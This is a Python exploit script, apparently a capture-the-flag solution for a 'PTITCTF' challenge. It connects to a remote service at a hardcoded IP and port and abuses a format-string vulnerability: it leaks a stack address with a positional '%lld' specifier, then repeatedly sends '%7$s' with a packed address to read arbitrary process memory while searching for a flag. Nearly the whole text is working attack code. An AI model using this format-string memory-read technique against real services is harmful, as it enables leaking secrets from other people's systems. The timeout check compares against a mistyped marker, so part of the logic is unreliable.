#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn(); buf=leak_lld(s,2)
print("buf=",hex(buf))
found=[]
try:
    rel=0
    while rel < 0x20000:
        X=buf+rel
        r=readmem(s,X)
        if b'PTITCTF' in r or b'2026' in r or b'{' in r:
            print("MARK",hex(X),repr(r[:250])); found.append(X)
            if b'}' in r:
                m=re.search(rb'[A-Za-z0-9_]+\{[^}]{5,}\}', r)
                if m: print("FLAG?", m.group(0))
                break
        if r==b'' or r==b'<T':
            try: s.close()
            except: pass
            s=newconn(); buf=leak_lld(s,2); rel=0
            if buf is None: break
        else:
            strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
            adv=max(len(strb),1)
            rel+=adv
except Exception as e:
    print("err",e)
print("found", [hex(x) for x in found])
s.close()
